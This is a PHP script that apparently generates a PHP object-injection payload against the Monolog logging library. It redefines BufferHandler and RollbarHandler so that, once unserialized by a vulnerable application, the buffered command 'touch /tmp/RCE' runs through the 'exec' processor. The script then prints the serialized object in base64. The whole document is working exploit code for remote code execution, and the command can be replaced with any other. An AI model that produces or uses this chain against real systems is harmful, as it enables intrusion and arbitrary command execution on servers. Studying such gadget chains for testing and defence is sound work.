<?php

namespace Monolog\Handler;

class BufferHandler
{
    protected $handler;
    protected $bufferSize = 1;
    protected $bufferLimit = 0;
    protected $flushOnOverflow = false;
    protected $initialized = false;
    protected $level = null;

    protected $buffer = [["touch /tmp/RCE", "level" => null]];
    protected $processors = ["current", "exec"];


    public function __construct()
    {
        $this->handler = clone $this;
    }
}

class RollbarHandler
{
    protected $rollbarNotifier;
    protected $hasRecords = true;

    public function __construct($x)
    {
        $this->rollbarNotifier = $x;
    }
}

$o = new RollbarHandler(
    new BufferHandler()
);

echo base64_encode(serialize($o)) . "\n";
